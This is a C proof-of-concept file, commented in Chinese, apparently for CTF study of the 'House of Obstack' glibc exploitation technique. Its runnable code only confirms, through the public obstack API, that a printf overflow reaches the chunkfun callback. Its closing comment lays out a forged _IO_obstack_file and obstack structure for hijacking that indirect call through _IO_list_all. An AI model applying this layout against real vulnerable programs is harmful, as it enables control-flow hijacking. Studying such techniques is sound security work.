#define _GNU_SOURCE
/*
 * 手法：通过 House of Obstack 到达分配回调，适用于 glibc 2.23～2.36。
 *
 * 这份程序通过公开 obstack API 建立一个真实对象，再故意耗尽当前 chunk，
 * 从而执行旧实现中的真实调用链：
 *
 *   从格式化入口 obstack_printf 开始，
 *     -> 经合法虚表 _IO_obstack_jumps 调用 _IO_obstack_xsputn，
 *     -> 再进入扩容函数 _obstack_newchunk，
 *     -> 最终调用 obstack.chunkfun(obstack.extra_arg, new_size)。
 *
 * 合法 API 当然不是漏洞；CTF 的 House of Obstack 是先覆盖 fake
 * `_IO_obstack_file` 中的 obstack.chunkfun/extra_arg，再借合法 libio vtable
 * 到达同一个间接调用。本 PoC 只隔离验证最终触发点的参数顺序与版本边界。
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* obstack.h 的便捷宏要求调用者提供默认分配器。下面实际使用带 extra_arg
   的 specify 接口，但保留定义可避免不同 glibc 头文件的兼容问题。 */
#define obstack_chunk_alloc malloc
#define obstack_chunk_free free
#include <obstack.h>

static int controlled_marker;
static int callback_count;
static int free_count;
static void *last_extra_arg;
static long last_requested_size;

static void *controlled_chunkfun(void *extra_arg, long size)
{
    callback_count++;
    last_extra_arg = extra_arg;
    last_requested_size = size;
    return malloc((size_t)size);
}

static void controlled_freefun(void *extra_arg, void *chunk)
{
    assert(extra_arg == &controlled_marker);
    free_count++;
    free(chunk);
}

int main(void)
{
    setbuf(stdout, NULL);

    struct obstack obs;
    int initialized = obstack_specify_allocation_with_arg(
        &obs,
        0x100,                    /* 初始 chunk 的最小请求大小。 */
        0,                        /* 使用默认机器字对齐。 */
        controlled_chunkfun,
        controlled_freefun,
        &controlled_marker);      /* 将成为 chunkfun 的第一个参数。 */
    assert(initialized != 0);

    /* 初始化本身会调用一次 chunkfun；从这里重新计数，只观察 printf 扩容。 */
    callback_count = 0;
    last_extra_arg = NULL;
    last_requested_size = 0;

    size_t room = obstack_room(&obs);
    size_t text_length = room + 0x1000;
    char *text = malloc(text_length + 1);
    assert(text != NULL);
    memset(text, 'A', text_length);
    text[text_length] = '\0';

    int written = obstack_printf(&obs, "%s", text);
    assert(written == (int)text_length);
    assert(callback_count >= 1);
    assert(last_extra_arg == &controlled_marker);
    assert(last_requested_size > 0);

    free(text);
    obstack_free(&obs, NULL);
    assert(free_count >= 1);
    puts("[+] Obstack：chunkfun 命中");
    return 0;
}

/*
 * ======================== fake obstack FILE 伪代码 ========================
 *
 * 上面的可执行部分用合法公开 API 验证 chunkfun(extra_arg, size) 的真实
 * 调用约定。若题目能覆盖 `_IO_obstack_file`，最小布局如下：
 *
 *     fake_file._IO_write_base = 0；
 *     fake_file._IO_write_ptr = 1；
 *     fake_file._lock = 可写零区；
 *     fake_file.vtable = _IO_obstack_jumps；
 *     fake_file[0xe0] = &fake_obstack；
 *
 *     fake_obstack.object_base = 可控缓冲区；
 *     fake_obstack.next_free = 可控缓冲区末尾；
 *     fake_obstack.chunk_limit = fake_obstack.next_free；
 *     fake_obstack.chunkfun = 受控函数；
 *     fake_obstack.extra_arg = 第一个参数；
 *     fake_obstack.use_extra_arg = 1；
 *
 *     把 fake_file 投递到 `_IO_list_all` 或实际会调用该表的流；
 *     触发写入，使 obstack 没有剩余空间并进入 `_obstack_newchunk`；
 *
 * 2.37 起请改看 House of Snake；新 printf_buffer 路径不是本布局的偏移修复。
 */
